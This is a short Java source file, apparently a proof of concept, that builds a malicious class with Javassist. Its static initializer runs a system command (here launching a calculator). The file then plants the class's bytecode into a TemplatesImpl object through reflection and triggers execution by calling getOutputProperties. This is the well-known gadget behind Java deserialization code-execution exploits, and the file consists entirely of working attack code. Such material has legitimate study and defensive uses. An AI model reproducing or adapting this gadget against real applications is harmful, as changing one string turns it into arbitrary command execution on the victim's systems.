package Javasist;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import java.lang.reflect.Field;

public class evil {
    public static void main(String[] args) throws Exception {


        TemplatesImpl template = new TemplatesImpl();
        setField(template,"_name","pysnow");
        setField(template,"_bytecodes",new byte[][] {getTemplateCoed()});
        setField(template,"_tfactory",new TransformerFactoryImpl());
        template.getOutputProperties();


    }
    public static byte[] getTemplateCoed() throws Exception {
        ClassPool cp = ClassPool.getDefault();
        CtClass evil = cp.makeClass("Javasist.evil");
        evil.setSuperclass(cp.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        CtConstructor initializer = evil.makeClassInitializer();
        initializer.setBody("Runtime.getRuntime().exec(\"calc\");");
        byte[] evilBytecode = evil.toBytecode();
        return evilBytecode;
    }
    public static void setField(Object object,String name,Object value) throws Exception {
        Field field= object.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(object,value);
    }
}
